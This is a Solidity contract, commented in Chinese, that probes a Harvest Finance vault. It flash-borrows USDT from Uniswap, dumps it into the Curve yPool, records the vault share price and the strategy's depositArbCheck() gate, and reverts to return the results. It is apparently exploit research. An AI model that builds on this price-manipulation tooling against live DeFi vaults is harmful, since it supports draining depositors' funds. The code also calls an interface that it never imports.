// SPDX-License-Identifier: MIT
pragma solidity =0.8.10;

import "./interfaces/IERC20Like.sol";
import "./interfaces/IUniswapV2PairLike.sol";
import "./interfaces/ICurveYPoolLike.sol";
import "./interfaces/IHarvestVaultLike.sol";

/// @title 套利闸门探针（3% 阈值的可复核证据）
/// @notice 用法：闪电借出 amount 个 tilt 币 -> 全部砸进 yPool -> 读取
///         strategy.depositArbCheck() 与金库份额价，然后把结果编码进 revert 数据返回。
///         因为最终 revert，Uniswap 的 k 校验不会执行，探针不需要真的还钱。
contract ArbGateProbe {
    struct Cfg {
        address vault;     // Harvest 金库
        address tilt;      // 用于砸盘的币（USDT）
        address curvePool; // Curve yPool
        address pairTilt;  // tilt 的 Uniswap V2 交易对
        uint256 amount;    // 砸盘数量
        int128 idxTilt;    // tilt 币序
        int128 idxWant;    // 金库本金币序
    }

    struct Result {
        bool gateOpen;          // strategy.depositArbCheck()
        uint256 dumpOut;        // 砸盘换出的 want
        uint256 virtualPrice;   // 砸盘后的 get_virtual_price()
        uint256 ppfsAfter;      // 砸盘后的金库份额价（1e6 标度）
        uint256 ppfsBefore;     // 砸盘前的金库份额价
    }

    function probe(Cfg calldata c) external {
        uint256 out0;
        uint256 out1;
        if (IUniswapV2PairLike(c.pairTilt).token1() == c.tilt) {
            out1 = c.amount;
        } else {
            out0 = c.amount;
        }
        IUniswapV2PairLike(c.pairTilt).swap(out0, out1, address(this), abi.encode(c));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata data) external {
        Cfg memory c = abi.decode(data, (Cfg));
        Result memory r;
        r.ppfsBefore = IHarvestVaultLike(c.vault).getPricePerFullShare();

        uint256 bal = IERC20Like(c.tilt).balanceOf(address(this));
        (bool ok, ) = c.tilt.call(abi.encodeWithSelector(IERC20Like.approve.selector, c.curvePool, bal));
        require(ok, "approve failed");
        uint256 before = 0;
        address want = IHarvestVaultLike(c.vault).underlying();
        before = IERC20Like(want).balanceOf(address(this));
        ICurveYPoolLike(c.curvePool).exchange_underlying(c.idxTilt, c.idxWant, bal, 0);
        r.dumpOut = IERC20Like(want).balanceOf(address(this)) - before;

        r.virtualPrice = ICurveYPoolLike(c.curvePool).get_virtual_price();
        r.ppfsAfter = IHarvestVaultLike(c.vault).getPricePerFullShare();
        r.gateOpen = IHarvestStrategyLike(IHarvestVaultLike(c.vault).strategy()).depositArbCheck();

        // 把结果塞进 revert 数据返回（探针不需要还贷）
        bytes memory payload = abi.encode(r);
        assembly {
            revert(add(payload, 32), mload(payload))
        }
    }
}
